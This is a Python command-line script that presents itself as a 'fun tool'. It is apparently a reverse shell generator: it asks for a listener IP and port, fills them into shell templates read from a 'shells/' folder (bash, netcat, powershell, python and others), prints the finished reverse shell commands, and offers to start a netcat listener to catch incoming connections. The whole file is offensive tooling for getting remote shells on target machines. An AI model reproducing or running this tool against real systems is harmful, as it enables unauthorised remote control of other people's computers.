#!/usr/bin/env python3

import os
import sys
import time
import platform
import argparse
import netifaces
from colorama import init, Fore, Style
from prompt_toolkit import prompt
from prompt_toolkit.shortcuts import yes_no_dialog, ProgressBar
from prompt_toolkit.styles import Style as PTStyle

init()

style = {
    'header': Fore.CYAN + Style.BRIGHT,
    'success': Fore.GREEN + Style.BRIGHT,
    'error': Fore.RED + Style.BRIGHT,
    'input': Fore.YELLOW + Style.BRIGHT,
    'info': Fore.BLUE + Style.BRIGHT,
    'reset': Style.RESET_ALL
}

def animated_greet():
    message = f"{style['header']}Thanks for using this fun tool!{style['reset']}"
    for char in message:
        print(char, end='', flush=True)
        time.sleep(0.05)
    print("\n")

def clear():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def animated_logo():
    logo = f"""
{style['header']}_____ _          _ _ _   _       _ _     
/  ___| |        | | | | | |     | | |    
\\ `--.| |__   ___| | | | | | __ _| | | ___ _   _
 {style['error']} `--. \\ '_ \\ / _ \\ | | | | |/ _` | | |/ _ \\ | | |
/\\__/ / | | |  __/ | \\ \\_/ / (_| | | |  __/ |_| |
\\____/|_| |_|\\___|_|_|\\___/ \\__,_|_|_|\\___|\\__, |
                                            __/ | 1.0.0
{style['success']}TRHACKNON {style['header']}(github.com/tucommenceapousser){style['reset']} |___/"""
    for line in logo.splitlines():
        print(line)
        time.sleep(0.1)

def disp():
    clear()
    animated_logo()

default_shell = "bash"

available_shells = [
    "bash", "php", "python", "python3", "perl", 'java',
    'javascript', 'node', "netcat", 'awk', 'gawk',
    'telnet', 'golang', 'powershell', 'tclsh', "ruby",
    "xterm", "ncat", "socket"
]

disp()
parser = argparse.ArgumentParser(description=f"{style['info']}Help Center{style['reset']}")
parser.add_argument('-l', '--list', dest='list', help="List of available shells", action='store_true')
parser.add_argument('-i', '--ip', dest='lhost', type=str, help="Specify IP address", required=False)
parser.add_argument('-p', '--port', dest='port', type=int, help="Specify port", required=False)
parser.add_argument('-s', '--shell', dest='shell', type=str, help="Specify shell type", required=False)

args = parser.parse_args()

if args.list:
    disp()
    print(f"{style['info']}Available Shells are : {style['reset']}" + ', '.join(available_shells))
    sys.exit()

shellType = args.shell if args.shell else default_shell

if not args.lhost:
    disp()
    print(f"{style['header']}------- SELECT IP -------{style['reset']}")
    for interface in netifaces.interfaces():
        try:
            ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
            print(f"{style['success']}[+] {style['reset']}{interface} : {style['info']}{ip}")
        except (KeyError, IndexError):
            continue
    print(f"{style['input']}>> Enter IP address:{style['reset']} ", end="")
    lhost = input().strip()
else:
    lhost = args.lhost

port = args.port if args.port else 1234

def listener():
    print(f"\n{style['error']}[*] Starting listener at port {port}{style['reset']}")
    os.system(f"netcat -lvnp {port}")

disp()

if shellType not in available_shells:
    print(f"{style['error']}[!] No shell available named '{shellType}'. Use --help for available options.{style['reset']}")
    sys.exit()

shell_file = f'shells/{shellType}'

with open(shell_file, "r") as shell:
    shells_list = shell.readlines()
    print(f"""
  {style['header']}[#] ShellType : {style['success']}{shellType}
  {style['header']}[#] LHOST     : {style['success']}{lhost}
  {style['header']}[#] LPORT     : {style['success']}{port}
  {style['header']}[#] Please Wait.....{style['reset']}
    """)

    with ProgressBar() as pb:
        for _ in pb(range(len(shells_list))):
            time.sleep(0.1)  

    for shell in shells_list:
        shell = shell.strip().replace("$IP", lhost).replace("$PORT", str(port))
        if "." not in shell:
            print(f"\n<<<< {style['header']}{shell}{style['reset']} >>>>\n")
        else:
            print(f"{style['info']}---> {style['error']}{shell}{style['reset']}")

custom_style = PTStyle.from_dict({
    'dialog': 'bg:#005f5f fg:#ffffff',  
    'dialog.body': 'bg:#000000 fg:#ffff00',  
    'dialog.shadow': 'bg:#00af87',  
    'dialog frame.label': 'bg:#5f005f fg:#ffffff',  
    'dialog.button': 'bg:#ffaf00 fg:#000000',  
    'dialog.button.focused': 'bg:#ff5f00 fg:#ffffff',  
})

user_response = yes_no_dialog(
    title="Listener",
    text="Do you want to start the listener?",
    style=custom_style
).run()

if user_response:
    listener()
else:
    animated_greet()
    sys.exit()
